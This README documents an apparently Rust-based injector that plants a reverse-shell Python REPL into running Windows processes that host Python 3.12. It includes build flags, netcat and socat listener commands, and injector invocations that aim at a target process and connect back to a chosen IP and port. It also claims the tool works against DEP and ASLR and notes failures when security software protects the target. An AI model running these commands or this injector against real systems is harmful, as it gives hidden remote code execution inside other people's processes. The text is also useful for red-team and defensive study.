# Python REPL Injector

A Rust-based tool for injecting a Python REPL into running processes that have Python 3.12 interpreter(s). The tool injects a reverse shell REPL into existing Python interpreters within the target process.

## Features

- Injects into existing Python 3.12 interpreters (no spawning)
- Supports multiple interpreters in a single process
- Clean and safe injection using Windows user-mode APIs
- Configurable connection parameters (IP and port)
- Works with DEP and high-entropy ASLR enabled targets

## Prerequisites

- Windows 11 with Administrator privileges
- Rust toolchain (stable)
- Target process must be running Python 3.12

## Building

Due to the nature of the injection process, we need to increase the stack size. Use the following commands to build and run:

```powershell
# Set increased stack size
$env:RUSTFLAGS="-C link-args=/STACK:16777216"

# Build the project
cargo build --release
```

## Usage

1. First, set up a listener on your machine. You can use either netcat or socat:

   Using netcat:
   ```powershell
   # Windows netcat
   nc -lvp 1337

   # Linux netcat
   nc -lvnp 1337
   ```

   Using socat (recommended for better stability):
   ```powershell
   # Windows
   socat TCP-LISTEN:1337,reuseaddr -

   # Linux
   socat TCP-LISTEN:1337,reuseaddr,fork -
   ```

2. Run the injector:

   ```powershell
   # Default settings (localhost:1337)
   cargo run --release -- --target exefile.exe

   # Custom IP and port
   cargo run --release -- --target exefile.exe --ip 192.168.1.100 --port 4444

   # Using process ID instead of name
   cargo run --release -- --target 1234
   ```

   Command line options:
   - `--target`: Process name or PID (default: "exefile.exe")
   - `--ip`: IP address to connect to (default: "127.0.0.1")
   - `--port`: Port number to connect to (default: 1337)

3. Once connected, you'll get a Python REPL in your listener. Features:
   - Multiline code support (send empty line to execute)
   - Full access to Python's standard library
   - Exception traceback reporting
   - Type 'exit' to close the connection

## Example Session

```python
# In your listener after successful injection:

# Simple command
print("Hello from injected process!")

# Multiline code (send empty line to execute)
def get_process_info():
    import os
    import sys
    return {
        'pid': os.getpid(),
        'python_version': sys.version,
        'cwd': os.getcwd()
    }

print(get_process_info())

# Exit the REPL
exit
```

## Security Considerations

- This tool requires Administrator privileges
- The connection is unencrypted - use only in controlled environments
- The injected code runs with the same privileges as the target process
- Be cautious when injecting into critical system processes

## Troubleshooting

1. If the connection fails:
   - Ensure your firewall allows the connection
   - Verify the target process is running and has Python 3.12
   - Check if another process is using the same port

2. If injection fails:
   - Verify you have Administrator privileges
   - Ensure the target process is not protected by security software
   - Check if the process has Python 3.12 loaded

## License

MIT License - See LICENSE file for details 